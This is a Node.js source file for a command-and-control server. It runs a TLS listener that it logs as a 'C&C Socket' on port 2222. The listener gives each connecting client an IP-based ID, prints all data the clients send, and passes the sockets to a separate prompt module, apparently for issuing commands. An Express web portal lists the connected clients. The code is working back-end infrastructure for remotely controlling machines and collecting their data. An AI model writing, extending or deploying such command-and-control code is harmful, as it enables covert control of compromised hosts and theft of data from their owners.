// Core modules 
const tls = require('tls')
var fs = require('fs')
var path = require('path');

// npm modules
const chalk = require('chalk')
const express = require('express')
const hbs = require('hbs')

// custom modules
const prompt = require('./utils/prompt');
const { allowedNodeEnvironmentFlags } = require('process');

/**
 * options object stores the private key and public cert to be used by tls socket for traffic encryption.
 * Note: the same key may end up being used for https web portal as well.
 */
const options = {
    key: fs.readFileSync('server-cert/private-key.pem'),
    cert: fs.readFileSync('server-cert/public-cert.pem')
}

const publicDirectoryPath = path.join(__dirname, './public')
const viewsPath = path.join(__dirname, './templates/views')
const partialsPath = path.join(__dirname, './templates/partials')

// Blank object to store client socket objects. This variable is pass to "prompt.js"
let clients = {}

/**
 * Purpose: to initialize clients connecting and assign unique ID to store in "clients" object
 */
var server = tls.createServer(options, (client) => {
    
    // Assign IPv4-{random number between 1-100000} to each client and store within the socket object
    client.connID = client.remoteAddress.replace(/^.*:/, '') + '-' + Math.floor(Math.random() * 100000)
    console.log(chalk.green(client.connID))

    // Add the client into the "clients" object and use their unique ID as the key to access the client
    clients[client.connID] = client
    client.write(chalk.green(`1Connected! Your id is ${client.connID}\r\n`))

    // Dump data from any client to console along with their ID
    client.on('data', (data) => {
        console.log(`From Client (${client.connID}):\n ${data.toString()}`)
    })

    // When client disconnects, remove it from the "clients" object
    client.on('close', () => {
        console.log(chalk.red(`Client has disconnected ${client.connID}`))
        delete clients[client.connID]
    })

    // when client throws error, remove it from the "clients" object
    client.on('error', (error) => {
        console.log(chalk.red(`Error has occured on ${client.connID}\n${error}`))
        delete clients[client.connID]
    })
})

// Express app
const app = express()

app.set('view engine', 'hbs')
app.set('views', viewsPath)
hbs.registerPartials(partialsPath)

app.use(express.static(publicDirectoryPath))

// Default express route that displays all connected clients on the home page
app.get('', (req, res) => {
    let clientList = []
    
    Object.keys(clients).forEach((key) => {
        clientList.push(key)
    })

    console.log(clientList)
    // res.send(clientList)
    res.render('index', {
        clientList
    })
})

app.get('/client', (req,res) => {
    res.render('client', {
        client: req.query.id
    })
})

app.get('*', (req,res) => {
    res.send('404 Not found...')
})

/**
 * listen to incoming tls socket connections and pass by reference to utils/prompt function
 */
server.listen(2222, () => {
    console.log('C&C Socket is live on port 2222')

    prompt(clients)
})

/**
 * listen to http server on port 3000
 */
app.listen(3000, () => {
    console.log('Webserver is live on port 3000')
})